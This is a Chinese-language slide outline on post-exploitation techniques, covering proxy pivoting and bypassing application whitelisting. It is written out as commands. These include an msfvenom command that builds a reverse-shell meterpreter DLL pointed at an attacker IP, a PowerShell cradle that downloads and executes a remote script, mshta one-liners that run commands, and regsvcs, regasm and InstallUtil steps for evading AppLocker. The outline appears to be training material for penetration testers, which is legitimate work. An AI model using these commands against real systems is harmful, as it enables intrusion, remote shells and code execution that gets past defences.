# Shell is Only the Beginning —— 后渗透阶段的攻防对抗
作者：3gstudent & Evi1cg

> “作为一名进攻性研究人员，如果你能想到它，很可能已经有人做到了。而这些人并不是在安全会议上发言的那种人。”
> —— Matt Graeber

## 作者简介
- **3gstudent**
  - Good$Study
  - Good$Health
  - Good$Attitude$
- **Evi1cg**
  - Thin
  - WhiteHat
  - Security$Researcher

## 后渗透阶段概述
### 渗透测试
渗透测试是以特定业务系统为目标，识别出关键基础设施，并寻找客户组织中最具价值和需要进行安全保护的信息和资产的过程。

### 黑客攻击
黑客在成功渗透后会进一步扩大战果，并尽可能隐藏自身痕迹。以下是常见的后渗透操作：

1. **打开一扇窗 (Open Proxy)**
   - **为什么使用代理？**
     - 更好地接触到目标所处环境。
     - 使用已有Shell的机器作为跳板，扩大战果。
     - 这只是开始。
   - **常用方法**
     - **端口转发**：LCX, Netsh, Metasploit Portfwd
     - **Socks代理**：Ew, Xsocks, ReGeorg, Metasploit Socks4a
     - **其他**：SSH, ICMP等
     - **VPN**

2. **绕过看门狗 (Bypass Application Whitelisting)**
   - **绕过思路**
     - HTA
     - Office Macro
     - CPL
     - CHM
     - PowerShell
     - Rundll32
     - Regsvr32
     - Regsvcs
     - Installutil
   - **示例**
     - **HTA**
       ```powershell
       Mshta.exe vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close)
       Mshta.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
       ```
     - **Office Macro**
       - **MacroRaptor**：用于检测恶意VBA宏，Python编写。
       - [更多信息](https://bitbucket.org/decalage/oletools/wiki/mraptor)
     - **CPL**
       - 生成Payload.dll：
         ```bash
         msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' LHOST=192.168.127.132 LPORT=8888 -f dll -o payload.dll
         ```
       - 直接运行dll：
         ```bash
         rundll32 shell32.dll,Control_RunDLL payload.dll
         ```
       - 将dll重命名为cpl，双击运行。
       - 普通的dll直接改后缀名。
       - [更多信息](http://drops.wooyun.org/tips/16042)
     - **CHM**
       - 高级组合技打造“完美”捆绑后门：
         - [更多信息](http://drops.wooyun.org/tips/14254)
       - 利用系统CHM文件实现隐蔽后门：
         - [更多信息](《那些年我们玩过的奇技淫巧》)
     - **PowerShell**
       - 命令示例：
         ```powershell
         powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')
         Get-Content payload.ps1 | iex
         cmd.exe /K key.snk
         $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVA...（省略）'
         $Content = [System.Convert]::FromBase64String($key)
         Set-Content key.snk -Value $Content -Encoding Byte
         C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:Regasm.dll /keyfile:key.snk Regasm.cs
         C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Regasm.dll
         C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe Regasm.dll
         //如果没有管理员权限使用/U来运行
         C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U Regasm.dll
         C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U Regasm.dll
         ```
       - [更多信息](https://gist.github.com/subTee/e1c54e1fdafc15674c9a)
     - **Installutil**
       - 编译：
         ```bash
         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:InstallUtil.exe InstallUtil.cs
         ```
       - 编译以后用/U参数运行：
         ```bash
         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U InstallUtil.exe
         ```
       - [更多信息](http://subt0x10.blogspot.jp/2015/08/application-whitelisting-bypasses-101.html, http://drops.wooyun.org/tips/8862)
     - **可执行目录**
       - 通过ps脚本扫描可写入的路径:
         - [脚本下载地址](http://go.mssec.se/AppLockerBC)
       - [更多信息](http://drops.wooyun.org/tips/11804)

3. **最直接的方式**
   - （待补充）

以上是后渗透阶段的一些常见技术和方法，希望对大家有所帮助。